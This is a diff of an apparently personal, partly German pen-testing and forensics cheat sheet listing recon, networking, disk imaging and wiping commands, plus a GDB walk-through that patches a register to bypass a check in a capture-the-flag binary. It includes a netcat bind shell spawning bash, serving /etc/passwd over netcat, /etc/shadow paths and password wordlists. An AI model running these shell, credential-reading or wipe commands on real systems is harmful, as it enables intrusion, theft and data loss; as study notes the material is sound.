@@ -4,16 +4,15 @@
 - [Important CLI commands & hacks for fun and profit](#important-cli-commands--hacks-for-fun-and-profit)
   - [Google searches](#google-searches)
   - [Command line stuff](#command-line-stuff)
-    - [Basics](#basics)
-      - [Important folders and files](#important-folders-and-files)
-      - [GDB](#gdb)
-    - [Networking](#networking)
+    - [Important folders and files](#important-folders-and-files)
+    - [Basics & Networking](#basics--networking)
     - [Discs & Forensics](#discs--forensics)
       - [Info about disks & their sizes](#info-about-disks--their-sizes)
       - [WIPE a disk (CAUTION)](#wipe-a-disk-caution)
       - [Copy/Backup files or disks](#copybackup-files-or-disks)
       - [RAM](#ram)
       - [OSX](#osx)
+    - [GDB](#gdb)
 
 <!-- END doctoc generated TOC please keep comment here to allow auto update -->
 
@@ -27,7 +26,17 @@ This document contains important cli commands, pen testing tools, forensic hacks
 
 ## Command line stuff
 
-### Basics
+### Important folders and files
+
+```bash
+/etc/password
+/etc/shadow
+/var/log
+/usr/share/wordlists/ -> kali wordlists (locate wordlists)
+less  /usr/share/wordlists/rockyou.txt # good for passwords (kali)
+```
+
+### Basics & Networking
 
 ```bash
 # find stuff
@@ -45,65 +54,27 @@ find / -perm -4000 -type f 2>/dev/null
 
 # hashsums
 sha256sum package.json
-```
 
-#### Important folders and files
-
-```bash
-/etc/password
-/etc/shadow
-/var/log
-/usr/share/wordlists/ -> kali wordlists (locate wordlists)
-less  /usr/share/wordlists/rockyou.txt # good for passwords (kali)
-```
-
-#### GDB
-
-1. mit scp die binary auf kali host downloadn
-2. gdb ./flag-extramile4
-3. > start
-4. > disas
-
-```
-Dump of assembler code for function main:
-0x00005555555551e6 <+0>: push rbp
-0x00005555555551e7 <+1>: mov rbp,rsp
-=> 0x00005555555551ea <+4>: sub rsp,0xe0
-0x00005555555551f1 <+11>: mov DWORD PTR [rbp-0xd4],edi
-0x00005555555551f7 <+17>: mov QWORD PTR [rbp-0xe0],rsi
-0x00005555555551fe <+24>: lea rdi,[rip+0xe08] # 0x55555555600d
-0x0000555555555205 <+31>: call 0x555555555050 <system@plt>
-0x000055555555520a <+36>: test eax,eax
-0x000055555555520c <+38>: jne 0x555555555238 <main+82>
-0x000055555555520e <+40>: mov rax,QWORD PTR [rip+0x2e4b]
-```
-
-5. break \*0x000055555555520a
-6. run
-   -> breakt dann direkt bei \*0x000055555555520a
-
-7. info reg eax
-
-output 0
-
-8. set $eax=1
-
-WICHTIG: jne sprint wenn eax NICHT 0 is.
-deshalb setzen wir eax einfach hart auf 1 HAHAHAHHAHAH
-
-9. nun steppen bis wir den flag haben. NICE!!!
-
-### Networking
-
-```bash
 # Restart services
 service apache2 restart
 sudo systemctl restart mysql
 
+# get distro/linux version
+cat /etc/*-release
+lsb_release -a
+uname -a
+uname -mrs
+cat /proc/version
 
-Simple network basics
+# caesar chiffre
+tr "A-Za-z" "N-ZA-Mn-za-m" < text.txt > encrypted.txt
+tr "A-Za-z" "N-ZA-Mn-za-m" < encrypted.txt > text.txt
+```
 
-ifconfig
+### Network stuff
+
+```bash
+hostname -A
 ip addr
 nmcli
 nmcli device show
@@ -111,6 +82,29 @@ nmcli connection show
 
 # Active Internet connections (including servers)
 netstat -at
+ifconfig
+
+netstat -tunp
+
+# Routing tables
+netstat -r -n
+
+# ARP table
+arp -a
+
+# displays the route a packet took to reach the host
+traceroute google.com
+
+# logged in users on system
+w
+who -T
+last
+finger
+
+# all processes
+ps -ef
+lsof
+
 ss -at
 # check open ports on a host
 ss -tln
@@ -119,8 +113,12 @@ ss -lun
 # Which process is listening in port 4444
 lsof -i tcp:4444
 
-# ALSO CHECK NETCAT (nc) BELOW!
+# time stuff
+uptime
+date
+uptime
 
+# ALSO CHECK NETCAT (nc) BELOW!
 
 # finds emails of a domain
 theHarvester -d mwager.de -b google
@@ -161,8 +159,8 @@ nmap -v -sn scanme.nmap.org/16
 # -sV -> check services running!
 nmap -v -A -sV scanme.nmap.org
 
-nmap scannt per default 1000 well known ports!
-Scann ALL PORTS:
+# nmap scannt per default 1000 well known ports!
+# Scann ALL PORTS:
 sudo nmap -A -sV -T5 10.5.123.0/24 -p- # also "-p-"
 
 # get ip and mac of neighbour
@@ -193,17 +191,18 @@ nc -lnvp 4444 < /etc/passwd
 # client:
 nc IP PORT > some_file
 
+# scp
+scp -r UserName@SourceHost:SourceDirectoryPath TargetFolderName
+
 # SHELL via nc ❤️❤️❤️
-nc -l -p 4444 -e /usr/bin/bash
-# other terminal:
+# On Host:
+nc -l -p 4444 -e /bin/bash
+# Client:
 ss -tln
 nc 127.0.0.1 4444
-ls
-bin
-brew.sh
-Desktop
-Documents
-... HAHAHAHAH
+whoami
+root
+...HAHAHAHAH
 
 # /dev/tcp
 echo "HALLO" >&/dev/tcp/127.0.0.1/4444
@@ -314,8 +313,17 @@ fstyp /dev/disk2s1 # partition meines usb sticks
 #### Info about disks & their sizes
 
 ```bash
+# mounted stuff
+mount -v
+ls /media # ls /Volumes
+
 df -H
 lsblk
+
+# Disk size
+du -sh /some/path
+> 42G	/some/path
+
 # OSX
 diskutil list
 
@@ -325,6 +333,25 @@ sudo fdisk -l /dev/sda
 # Get detailed infos about a disk
 sudo hdparm -I /dev/sda
 sudo ewfacquire /dev/sda
+```
+
+#### Copy/Backup files or disks
+
+```bash
+dd if=/dev/sda of=/path/to/my/backup
+
+# forensics extension of dd (e.g. hashing check auto!)
+dc3dd if=/dev/sda hof=/path/to/my/backup.raw hash=sha256
+
+-> fdkimager is GUI & free (win only)
+
+# over ssh - copy stuff encrypted and gzipped to my ssh server
+dd if=/dev/sda | pv | gzip -c | ssh USER@IP "cat > sda.dd"
+# also see sshfs ?!
+
+# EWF (Expert witness format)
+ewfaquire -t image.dd image.E01
+ewfexport image.E01
 ```
 
 #### WIPE a disk (CAUTION)
@@ -341,15 +368,26 @@ dc3dd wipe=/dev/sdb
 xxd -a /dev/sdb
 ```
 
-#### Copy/Backup files or disks
+#### Filesystems
 
 ```bash
-dd if=/dev/sda of=/path/to/my/backup
+# MBR (Master boot record) - Sector 0 (partition infos, attack vector...)
+# Bootcode Byte 0-439
+# Disksignature Byte 440-443
+# reserved Byte 444-445
+# Partitiontable Byte 446-509 (4 x 16byte)
+# Signature 0x55 0xAA 510-511
+# Copy only the MBR:
+sudo dd if=/dev/disk2 of=ntfs.raw bs=512 count=1 skip=0
+```
 
-# forensics extension of dd (e.g. hashing check auto!)
-dc3dd if=/dev/sda hof=/path/to/my/backup.raw hash=sha256
+#### Recover data
 
--> fdkimager is GUI & free (win only)
+Linux GUI for image analyse: dff (digital forensic framework) - similar to FTK imager
+
+```bash
+Tools for WIN: recuva, PC inspektor file recovery, DiskDigger, GlaryUndelete
+Tools for MAC: Disk Drill
 ```
 
 #### RAM
@@ -357,8 +395,9 @@ dc3dd if=/dev/sda hof=/path/to/my/backup.raw hash=sha256
 ```bash
 # Older unix:
 dd if=/dev/ram of=ram.dd
-
-
+# fmem: https://github.com/NateBrune/fmem
+# osx: MacMemoryReader
+# alternative via firewire (if pc locked (i.e. screensaver))
 ```
 
 #### OSX
@@ -368,3 +407,39 @@ dd if=/dev/ram of=ram.dd
 diskutil list # also spits out the mount names (e.g. "Macintosh HD" or "USBSTICK")
 diskutil unmountDisk /dev/disk2
 ```
+
+### GDB
+
+1. mit scp die binary auf kali host downloadn
+2. gdb ./flag-extramile4
+3. > start
+4. > disas
+
+```
+Dump of assembler code for function main:
+0x00005555555551e6 <+0>: push rbp
+0x00005555555551e7 <+1>: mov rbp,rsp
+=> 0x00005555555551ea <+4>: sub rsp,0xe0
+0x00005555555551f1 <+11>: mov DWORD PTR [rbp-0xd4],edi
+0x00005555555551f7 <+17>: mov QWORD PTR [rbp-0xe0],rsi
+0x00005555555551fe <+24>: lea rdi,[rip+0xe08] # 0x55555555600d
+0x0000555555555205 <+31>: call 0x555555555050 <system@plt>
+0x000055555555520a <+36>: test eax,eax
+0x000055555555520c <+38>: jne 0x555555555238 <main+82>
+0x000055555555520e <+40>: mov rax,QWORD PTR [rip+0x2e4b]
+```
+
+5. break \*0x000055555555520a
+6. run
+   -> breakt dann direkt bei \*0x000055555555520a
+
+7. info reg eax
+
+output 0
+
+8. set $eax=1
+
+WICHTIG: jne sprint wenn eax NICHT 0 is.
+deshalb setzen wir eax einfach hart auf 1 HAHAHAHHAHAH
+
+9. nun steppen bis wir den flag haben. NICE!!!
